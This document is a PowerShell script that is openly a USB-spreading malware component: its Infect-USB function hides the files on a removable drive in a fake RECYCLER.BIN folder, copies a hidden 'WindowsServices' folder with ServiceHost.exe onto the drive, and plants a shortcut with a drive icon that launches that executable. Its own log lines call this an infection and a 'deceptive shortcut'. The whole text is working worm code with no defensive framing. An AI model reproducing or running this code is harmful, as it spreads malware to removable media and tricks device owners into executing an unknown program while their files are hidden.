param (
    [string]$DriveLetter
)

$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
$crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"

function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Is-RemovableDrive {
    param ($DriveLetter)
    $drive = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='$DriveLetter'"
    return $drive -and $drive.DriveType -eq 2
}

function Infect-USB {
    param ($DriveLetter)
    $usbPath = "$DriveLetter\"
    $recyclerPath = "$usbPath\RECYCLER.BIN"
    $filesPath = "$recyclerPath\Files"
    $usbSoftwareFolder = "$usbPath\WindowsServices"
    $lnkPath = "$usbPath\SystemTools.lnk"
    try {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Detected USB at $usbPath. Starting infection process..."
        if (-not (Test-Path -Path $recyclerPath)) {
            New-Item -Path $recyclerPath -ItemType Directory -Force | Out-Null
            Set-ItemProperty -Path $recyclerPath -Name Attributes -Value "Hidden,System" -ErrorAction Stop
            Add-Content -Path $logPath -Value "[$(Get-Date)] Created hidden RECYCLER.BIN folder at $recyclerPath"
        }
        if (-not (Test-Path -Path $filesPath)) {
            New-Item -Path $filesPath -ItemType Directory -Force | Out-Null
            Add-Content -Path $logPath -Value "[$(Get-Date)] Created Files folder at $filesPath"
        }
        Get-ChildItem -Path $usbPath -File | ForEach-Object {
            if ($_.FullName -ne $lnkPath -and $_.FullName -ne $usbSoftwareFolder -and $_.Extension -ne ".lnk") {
                $retryCount = 3
                $success = $false
                for ($i = 0; $i -lt $retryCount; $i++) {
                    try {
                        Move-Item -Path $_.FullName -Destination $filesPath -Force -ErrorAction Stop
                        $success = $true
                        Add-Content -Path $logPath -Value "[$(Get-Date)] Moved file $($_.Name) to $filesPath"
                        break
                    } catch {
                        Start-Sleep -Milliseconds 500
                    }
                }
                if (-not $success) {
                    Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to move file $($_.Name) after $retryCount attempts."
                }
            }
        }
        if (Test-Path -Path $crackedSoftwareFolder) {
            Copy-Item -Path $crackedSoftwareFolder -Destination $usbPath -Recurse -Force -ErrorAction Stop
            Set-ItemProperty -Path $usbSoftwareFolder -Name Attributes -Value "Hidden,System" -ErrorAction Stop
            Add-Content -Path $logPath -Value "[$(Get-Date)] Copied WindowsServices folder to $usbSoftwareFolder"
        } else {
            Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: WindowsServices folder not found at $crackedSoftwareFolder, cannot copy to USB."
        }
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnkPath)
        $shortcut.TargetPath = "$usbSoftwareFolder\SystemCore\ServiceHost.exe"
        $shortcut.IconLocation = "%SystemRoot%\system32\imageres.dll,2"
        $shortcut.WorkingDirectory = "$usbSoftwareFolder\SystemCore"
        $shortcut.Save()
        Set-ItemProperty -Path $lnkPath -Name Attributes -Value "Hidden" -ErrorAction Stop
        Add-Content -Path $logPath -Value "[$(Get-Date)] Created deceptive shortcut at $lnkPath pointing to $usbSoftwareFolder\SystemCore\ServiceHost.exe"
    } catch {
        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to infect USB at $usbPath. Error: $($_.Exception.Message) | Stack: $($_.ScriptStackTrace)"
    }
}

if (-not (Is-Admin)) {
    Add-Content -Path $logPath -Value "[$(Get-Date)] ERROR: Script not running with Administrator privileges. Exiting."
    exit
}

if ($DriveLetter -and (Test-Path $DriveLetter) -and (Is-RemovableDrive -DriveLetter $DriveLetter)) {
    Infect-USB -DriveLetter $DriveLetter
} else {
    Add-Content -Path $logPath -Value "[$(Get-Date)] Invalid, missing, or non-removable DriveLetter parameter: $DriveLetter. Exiting."
}
